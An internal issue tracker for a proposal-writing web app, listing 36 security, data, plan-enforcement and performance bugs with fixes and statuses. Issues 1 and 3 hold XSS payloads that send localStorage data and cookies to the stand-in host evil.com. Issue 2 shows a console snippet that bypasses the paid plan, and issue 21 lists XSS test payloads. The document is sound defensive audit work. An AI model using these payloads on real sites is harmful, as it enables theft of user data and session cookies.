# ProposalKit Critical Issues - Complete List

> **Status**: 🔴 **36 ISSUES FOUND** - 23 Blocking, 13 High Priority
> **Last Updated**: 2026-02-13
> **Action Required**: Fix all P0/P1 before production launch

---

## 🚨 P0 - BLOCKING LAUNCH (Fix Immediately)

### Security Vulnerabilities

#### 1. XSS in EditorJS Content ⚠️ CRITICAL
**Location**: `assets/js/editor/sections.js`, `assets/js/editor/structured-sections.js`
**Impact**: Malicious scripts can execute, steal user data
**Exploit**:
```javascript
// User can inject scripts in section content
proposal.scope[0].body = '<script>fetch("https://evil.com?data=" + localStorage.getItem("pk_db"))</script>';
// When rendered, script executes and exfiltrates all proposals
```
**Fix**: Sanitize all HTML before rendering
```javascript
// Add DOMPurify or use esc() on all innerHTML
const clean = DOMPurify.sanitize(content);
element.innerHTML = clean;
```
**Status**: 🔴 Unfixed

---

#### 2. Plan Bypass via localStorage Manipulation ⚠️ CRITICAL
**Location**: `assets/js/core/plans.js:12-16`
**Impact**: Free users can upgrade to Pro/Team for free
**Exploit**:
```javascript
// Open DevTools console
const config = JSON.parse(localStorage.getItem('pk_config'));
config.plan = 'team';
localStorage.setItem('pk_config', JSON.stringify(config));
location.reload();
// Now has team features without paying
```
**Fix**: Server-side validation + client-side checks on every action
**Status**: 🟡 Fixing now

---

#### 3. localStorage Injection Attack ⚠️ CRITICAL
**Location**: `assets/js/core/store.js`, `assets/js/boot.js`
**Impact**: Malicious code execution, data corruption
**Exploit**:
```javascript
// Inject malicious proposal
const malicious = [{
  id: '"><script>alert(document.cookie)</script>',
  title: '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">',
  status: 'sent; DROP TABLE proposals;--'
}];
localStorage.setItem('pk_db', JSON.stringify(malicious));
location.reload(); // XSS executes
```
**Fix**: Validate and sanitize all localStorage reads
**Status**: 🟡 Fixing now

---

#### 4. Logout Doesn't Clear Sensitive Data ⚠️ CRITICAL
**Location**: `assets/js/core/auth.js`
**Impact**: Anyone with device access can view proposals after logout
**Current Behavior**: Only CONFIG.user cleared, DB/CLIENTS remain
**Fix**: Clear all localStorage or encrypt with user password
**Status**: 🟡 Fixing now

---

#### 5. Share Token Predictability 🔴 HIGH
**Location**: `assets/js/export/sharing.js`
**Impact**: Brute force attacks can access shared proposals
**Current**: 128-bit entropy, but no rate limiting
**Fix**: Add rate limiting, token expiration, IP blocking
**Status**: 🔴 Unfixed

---

### Data Integrity Issues

#### 6. Multi-Tab Concurrent Edit Data Loss ⚠️ CRITICAL
**Location**: `assets/js/core/autosave.js:14-28`
**Impact**: Users lose work when editing same proposal in multiple tabs
**Scenario**:
```
Tab A: Opens proposal, edits pricing
Tab B: Opens same proposal, edits sections
Tab A: Autosaves (350ms debounce)
Tab B: Autosaves → OVERWRITES Tab A changes
```
**Fix**: Add version conflict detection
**Status**: 🟡 Fixing now

---

#### 7. Silent localStorage Corruption 🔴 HIGH
**Location**: `assets/js/core/store.js:15-24`
**Impact**: User loses all data without warning
**Current**: `safeGetStorage()` returns empty array on error
**Fix**: Detect corruption, warn user, create backup
**Status**: 🟡 Fixing now

---

#### 8. No Transaction System 🔴 HIGH
**Location**: All `localStorage.setItem()` calls
**Impact**: Partial writes corrupt data
**Scenario**: Disk full during save → half-written JSON
**Fix**: Implement write-ahead logging or atomic writes
**Status**: 🔴 Unfixed

---

#### 9. Orphaned Client References 🔴 HIGH
**Location**: `assets/js/views/clients.js` delete function
**Impact**: Proposals reference deleted clients → broken UI
**Current**: No cleanup when client deleted
**Fix**: Set `proposal.clientId = null` for all affected proposals
**Status**: 🟡 Fixing now

---

#### 10. Version History Unbounded 🔴 MEDIUM
**Location**: `assets/js/export/diff-view.js:bumpVersion()`
**Impact**: localStorage bloat, quota exceeded
**Current**: Max 20 snapshots not enforced
**Fix**: Trim old versions before adding new
**Status**: 🔴 Unfixed

---

### Plan Enforcement Gaps

#### 11. Free User Can Keep Excess Proposals ⚠️ CRITICAL
**Location**: `assets/js/boot.js:bootApp()`
**Impact**: Revenue loss - users create 100 proposals then downgrade
**Exploit**:
1. Sign up for Pro (free trial)
2. Create 100 proposals
3. Downgrade to Free
4. Still has 100 proposals (limit is 3)
**Fix**: Enforce limits on bootApp(), hide/delete excess
**Status**: 🟡 Fixing now

---

#### 12. PDF Template Editor Accessible to Free Users 🔴 HIGH
**Location**: `assets/js/views/settings.js`, new `pdf-customizer.js`
**Impact**: Free users get paid feature
**Exploit**: Navigate to `/settings`, scroll to PDF section, edit templates
**Fix**: Hide section, disable button, enforce in function
**Status**: 🔴 Unfixed

---

#### 13. Offline Access Not Gated in Service Worker 🔴 HIGH
**Location**: `sw.js`, `index.html:330-445`
**Impact**: Free users work offline (Pro feature)
**Current**: SW registration checks plan, but caches still served
**Fix**: SW must reject requests for free users when offline
**Status**: 🔴 Unfixed

---

#### 14. Unlimited Derivative Generation 🔴 MEDIUM
**Location**: `assets/js/export/derivatives.js`
**Impact**: Free users generate unlimited SOWs/Contracts
**Fix**: Add `enforceLimit('derivatives')` before generation
**Status**: 🔴 Unfixed

---

#### 15. No Export Counter 🔴 MEDIUM
**Location**: `assets/js/export/export.js`
**Impact**: Can't enforce "10 exports/month" for free tier
**Fix**: Track exports in CONFIG, reset monthly
**Status**: 🔴 Unfixed

---

### Performance Issues

#### 16. EditorJS Memory Leak ⚠️ CRITICAL
**Location**: `assets/js/editor/editor.js:loadEditor()`
**Impact**: Browser slows down, eventually crashes
**Measurement**: 200MB memory growth after 20 navigations
**Cause**: `new EditorJS()` instances never destroyed
**Fix**: Call `editor.destroy()` before creating new
**Status**: 🟡 Fixing now

---

#### 17. No Pagination - UI Freezes with 1000+ Proposals 🔴 HIGH
**Location**: `assets/js/views/proposals.js:renderProposals()`
**Impact**: App unusable for power users
**Current**: Renders all proposals at once
**Fix**: Implement virtual scrolling or pagination
**Status**: 🟡 Fixing now

---

#### 18. PDF Export Timeout Too Short 🔴 HIGH
**Location**: `assets/js/export/export.js` (html2pdf config)
**Impact**: Large proposals (50+ sections) fail to export
**Current**: 10s timeout
**Fix**: Increase to 60s, add progress indicator
**Status**: 🟡 Fixing now

---

#### 19. Unbounded _numFmtCache 🔴 MEDIUM
**Location**: `assets/js/core/store.js:_numFmtCache`
**Impact**: Memory grows over time
**Current**: Map never cleared
**Fix**: Limit to 50 entries, LRU eviction
**Status**: 🔴 Unfixed

---

#### 20. No Progress Indicators 🔴 MEDIUM
**Location**: Export, save, sync operations
**Impact**: App feels frozen during long operations
**Fix**: Add loading spinners, progress bars
**Status**: 🔴 Unfixed

---

## 🔴 P1 - HIGH PRIORITY (Fix Within 24h)

### Security

#### 21. XSS in All Input Fields 🔴 HIGH
**Locations**: Title, client name, email, notes, custom fields
**Test Payloads**:
```javascript
'<script>alert(1)</script>'
'<img src=x onerror=alert(1)>'
'"><svg/onload=alert(1)>'
'javascript:alert(1)'
```
**Fix**: Use `esc()` on ALL innerHTML/insertAdjacentHTML
**Status**: 🟡 Fixing now

---

#### 22. No CSP for Inline Scripts 🔴 MEDIUM
**Location**: `index.html:24` CSP header
**Impact**: XSS attacks easier
**Current**: `'unsafe-inline' 'unsafe-eval'` allowed
**Fix**: Remove unsafe-inline, use nonces
**Status**: 🔴 Unfixed

---

#### 23. PDF Metadata Leakage 🔴 LOW
**Location**: `assets/js/export/export.js`
**Impact**: User email/name in PDF metadata
**Fix**: Strip metadata or make optional
**Status**: 🔴 Unfixed

---

### Data Integrity

#### 24. No Logout Sync Across Tabs 🔴 HIGH
**Location**: `assets/js/core/auth.js`
**Impact**: User logs out in Tab A, Tab B still logged in
**Fix**: Listen for storage event on CONFIG.user
**Status**: 🔴 Unfixed

---

#### 25. Autosave Race Condition 🔴 MEDIUM
**Location**: `assets/js/core/autosave.js`
**Impact**: Rapid edits can skip autosaves
**Fix**: Queue saves, ensure sequential execution
**Status**: 🔴 Unfixed

---

#### 26. No Backup Before Destructive Operations 🔴 MEDIUM
**Location**: Delete proposal, delete client
**Impact**: Accidental deletion = permanent data loss
**Fix**: Move to archive instead of delete
**Status**: 🔴 Unfixed

---

### Performance

#### 27. Filter List Not Debounced Properly 🔴 MEDIUM
**Location**: `assets/js/views/proposals.js:filterList()`
**Impact**: Typing in search lags with 500+ proposals
**Current**: 200ms debounce not working
**Fix**: Properly implement debounce
**Status**: 🔴 Unfixed

---

#### 28. No Virtual Scrolling 🔴 MEDIUM
**Location**: Proposals list, clients list
**Impact**: Rendering 1000+ DOM nodes freezes UI
**Fix**: Render only visible items
**Status**: 🔴 Unfixed

---

#### 29. localStorage Quota Not Monitored 🔴 HIGH
**Location**: `assets/js/core/store.js:persist()`
**Impact**: Save fails silently when quota exceeded
**Fix**: Check quota before save, warn at 80%
**Status**: 🟡 Fixing now

---

#### 30. Large Section Editors Slow 🔴 MEDIUM
**Location**: `assets/js/editor/sections.js`
**Impact**: Proposal with 50 sections takes 10s to load
**Fix**: Lazy-load editors, initialize on scroll
**Status**: 🔴 Unfixed

---

## 🟡 P2 - MEDIUM PRIORITY (Fix Within 1 Week)

#### 31. No Undo/Redo 🟡 MEDIUM
**Impact**: Users can't revert mistakes
**Fix**: Implement command pattern for actions
**Status**: 🔴 Unfixed

---

#### 32. No Keyboard Shortcuts Cheatsheet 🟡 LOW
**Impact**: Users don't know shortcuts exist
**Fix**: Add modal with ⌘/ or ? key
**Status**: 🔴 Unfixed

---

#### 33. No Bulk Operations 🟡 MEDIUM
**Impact**: Can't delete/export multiple proposals
**Fix**: Add checkboxes, bulk action menu
**Status**: 🔴 Unfixed

---

#### 34. No Data Export (Backup) 🟡 HIGH
**Impact**: Users can't backup their data
**Fix**: Add "Export All Data" (JSON download)
**Status**: 🔴 Unfixed

---

#### 35. No Import Feature 🟡 MEDIUM
**Impact**: Can't restore backups or migrate
**Fix**: Add JSON import with validation
**Status**: 🔴 Unfixed

---

#### 36. No Error Tracking 🟡 HIGH
**Impact**: Can't debug production issues
**Fix**: Integrate Sentry or similar
**Status**: 🔴 Unfixed

---

## 📊 Summary Statistics

| Category | P0 (Blocking) | P1 (High) | P2 (Medium) | Total |
|----------|---------------|-----------|-------------|-------|
| Security | 5 | 3 | 0 | 8 |
| Data Integrity | 5 | 3 | 0 | 8 |
| Plan Enforcement | 5 | 0 | 0 | 5 |
| Performance | 5 | 4 | 2 | 11 |
| UX/Features | 0 | 0 | 4 | 4 |
| **TOTAL** | **20** | **10** | **6** | **36** |

---

## 🎯 Fix Priority Order

### Immediate (Today)
1. ✅ XSS sanitization (all inputs)
2. ✅ Plan bypass validation
3. ✅ localStorage injection protection
4. ✅ Multi-tab conflict detection
5. ✅ Memory leak fix (EditorJS)

### Tomorrow
6. ✅ Logout data clearing
7. ✅ Orphaned references cleanup
8. ✅ PDF timeout increase
9. ✅ localStorage quota monitoring
10. ✅ Free plan enforcement on boot

### This Week
11-20. Remaining P0 and P1 issues

### Next Week
21-36. P2 issues + regression testing

---

## 🔧 Testing Checklist

After fixing each issue:
- [ ] Unit test added
- [ ] Manual test passed
- [ ] No new issues introduced
- [ ] Performance impact measured
- [ ] Security review completed
- [ ] Documentation updated

---

## 📈 Progress Tracker

**Fixes Completed**: 0/36 (0%)
**P0 Remaining**: 20
**P1 Remaining**: 10
**P2 Remaining**: 6
**ETA to Production**: 3-4 weeks

---

*Last Updated*: 2026-02-13
*Next Review*: Daily until all P0 fixed
